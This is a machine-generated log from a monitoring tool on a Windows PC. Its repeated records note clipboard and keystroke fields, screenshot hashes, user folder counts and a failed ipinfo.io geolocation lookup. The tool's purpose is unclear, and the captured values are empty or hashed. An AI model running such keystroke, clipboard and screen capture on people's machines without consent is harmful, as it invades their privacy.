{"timestamp": "2025-06-14T08:17:13.778911+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "82d610ff0684d265c4dfa6811c46b1e66aad3f862d97977f8708008f8c09b576", "_raw_log_hash": "5bef2b134d6f0594a5a841ed857423446bdf879aade7d9b0f94ff71055538799"}
{"timestamp": "2025-06-14T08:17:27.278157+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "cb4d6d511ae4f13bb87c284934b178757f1ba4bb12f0435e16c64dc2228efcd8", "_raw_log_hash": "495f9a881f73e8bd31f771ee7a04cdfe3d0ef6f2b0a051f6d6542e53a1eecde0"}
{"timestamp": "2025-06-14T08:17:40.852336+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d6d993bac3857c62a0a77d51771c594136badf971978d565e307c3dae6152f41", "_raw_log_hash": "5bc4198a8df756df5c42037a8880e3ab7d5e287058addd113e57097d035938d2"}
{"timestamp": "2025-06-14T08:17:54.309806+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b00486669f3f09a58f6b6ffd043e3f5a8a4f799be7074e38a99b4741afa54e6e", "_raw_log_hash": "6472b90e26626780a1182655a8001cc9632d8793c8ee5e5525334625c72ee6aa"}
{"timestamp": "2025-06-14T08:18:07.896942+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "00e223e52ef19544a90e4648e5498c57cf9a0bacf83f80fd5c0a97c7db967a1b", "_raw_log_hash": "c7826af91fb55ab2945482a7cdb8a6d7972d5d018e0c9e1895f174e90fb82cfb"}
{"timestamp": "2025-06-14T08:18:21.433928+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3f3359845d6e24532e55bf4d284f1280b00dc2539cde6154a2cea9cb954d7d10", "_raw_log_hash": "e1f1b11b6c04f23e9d4b7e6ea88cf527802c7c8f205998732a7e0611fa8a26c7"}
{"timestamp": "2025-06-14T08:18:34.935076+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2f5722f214b3681d06620f3d07e9f1388f7a159b9b0a48915ffb49ce03fbb206", "_raw_log_hash": "23c233c39c30b5a0191119a47bb678303cd419ad153c93f11df7fd2520998391"}
{"timestamp": "2025-06-14T08:18:48.425516+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b147452708f3d57dc515e21882dad93b755ba68a6a3ebf3f3b9cac8606f4cab0", "_raw_log_hash": "503d10be5c9048167f7a053bec775c17a97b00c38dc68314d8d7c22c8ba1885b"}
{"timestamp": "2025-06-14T08:19:01.906272+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "468a754fb5190fb44a73a81eeded596433aec761e799ef723ffbaac2b0d2f7ba", "_raw_log_hash": "8284d945b7000fb566a985fd066d485be6e83393162c2c89e0be466c2c572685"}
{"timestamp": "2025-06-14T08:19:15.406479+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2f052e6e5ad2a2fde4ba3ae301c1acf4e087374375ef01f4e3e4d1de08534be7", "_raw_log_hash": "a109ac1c0822f59d1fcbc9790ddf93033e069a826020ea8b67954944257c0ff0"}
{"timestamp": "2025-06-14T08:19:28.976429+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1279b40050db0a2255599f4c06e75978147597d2f6e799dc4dc306586f1c6f81", "_raw_log_hash": "5bfd1ca10fb4359e59153c54e8821b8bab39351a26d9c37d33e9148a0dcbdae8"}
{"timestamp": "2025-06-14T08:19:42.519472+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "731a8f22d1de994bb15cd326166d5aa0fd35700a9c7b88a46dbd9527a659cca5", "_raw_log_hash": "17210ae3d62db3749190e5288209eed91065ab02bcaf9ea677a4135d9d540be5"}
{"timestamp": "2025-06-14T08:19:56.089813+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0230e8886ba6a79ce2f3686863a405b78bfcce4c7e1826d7154f08f7d18addb1", "_raw_log_hash": "bcf0de9a9c45f7738c6df21725eea817e01cddc5f855e53864c2fad54609e7d0"}
{"timestamp": "2025-06-14T08:20:09.694164+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "78644dcb5c37c98b0a250e8a259a7e0f829a69ddc246b8bd61b64400c46b63b6", "_raw_log_hash": "14688cb1736b4f31ad5cf1bd31e7a068c0356f08869f9988d7584bb47ba6f060"}
{"timestamp": "2025-06-14T08:20:23.285000+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2b998e8535c9b752b943c617bd4373be1371ef7c315996196a2fbcb36fdda749", "_raw_log_hash": "cf0999efedf01a9e5be55360b1f580881fe45aa3de1bd20ea68b96aeb95363ca"}
{"timestamp": "2025-06-14T08:20:36.881447+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2faaf6af6ea37e31e59db68bcfa1fc8701fad84983ece6ae7a0f0b3785cb1fc7", "_raw_log_hash": "2731789b0480948b7022c03fc55a2adc73476fd05832e61d861099fa574c1c84"}
{"timestamp": "2025-06-14T08:20:50.397975+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a190c87e3ecd061b744307f2b79e512e374057de5f24df07f236ae3e8367d89f", "_raw_log_hash": "596597f243838a36dee571f5feb11637218e9cfa05452240419941a5442b0080"}
{"timestamp": "2025-06-14T08:21:04.130166+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "37519ea0312a23e293afa097853b53ed247ea3c1b8ff5a5f70e3199b011e42e6", "_raw_log_hash": "2a86c0c74460a3cb45c88a12477f544f4d06f45c0b6069d6449eac33f2c1cc41"}
{"timestamp": "2025-06-14T08:21:17.666248+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ed983036c81818b456b850c46cfcaf84c0299de43f170f1019d780f13472e6a0", "_raw_log_hash": "1f8042a279b2912e66fa082e18213f7a2f5fd60567889f72fb525efc5d1b71c5"}
{"timestamp": "2025-06-14T08:21:31.184345+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ca69894dfd43d295506be9965b1e641e0f7af2e1c13a00374a9bec525838491b", "_raw_log_hash": "1c5792395bcbda795cd56ca1e6b2803da2f7e907bc5d57f24ffac6e686a7d02d"}
{"timestamp": "2025-06-14T08:21:44.763952+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ed6dccd80d873da47a631cf9c45a835df681962b066bf1bbb17cbe1f8fa1f9c2", "_raw_log_hash": "4a97e0f273bf7dcf711c81c7c6718b0a632a423407749daaa65b7650530526b3"}
{"timestamp": "2025-06-14T08:21:58.265161+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f949a503f55b0467d0119eea59288dece2bba6a3b11ac321c77c3e20fe070717", "_raw_log_hash": "c260c712cde946f079817f93a4f0c408064f0254bdae8e1d6b5e8ad7fca8ecbb"}
{"timestamp": "2025-06-14T08:22:11.945855+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2a45a17396265e76fe2792a489f92ce3f47effd3834699b15c776cb3699813ef", "_raw_log_hash": "fbbe9d9ff3d93a95f1cbb80686800bf293266d3cbe66e2c92122d1ac13b30191"}
{"timestamp": "2025-06-14T08:22:25.446637+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "960f5bbe948aa7e14d43c18674325704bc0dff4c9c76a10647e76460d40652d6", "_raw_log_hash": "e8e5b2985793270b8e075a0565afdf7c4b06788c1762ea19f6d95d598eeced37"}
{"timestamp": "2025-06-14T08:22:39.018326+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "382dadd9a47af22cfd15067ecd4650312c8554b57368ed2512a8236c15fb46e9", "_raw_log_hash": "c8da14591674ab1344fc69b8a41a4af1918746ea84c3124edb0512b6f367d223"}
{"timestamp": "2025-06-14T08:22:52.663877+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "491fa586fd1bf87c8b2aa6fa0290dbbb6deb675bdb4a342160540fd0ffba1199", "_raw_log_hash": "a643cf5a261c1dc76418d5aa23b8c8e441297c77f3e2a3e11ef96cd566d1bce8"}
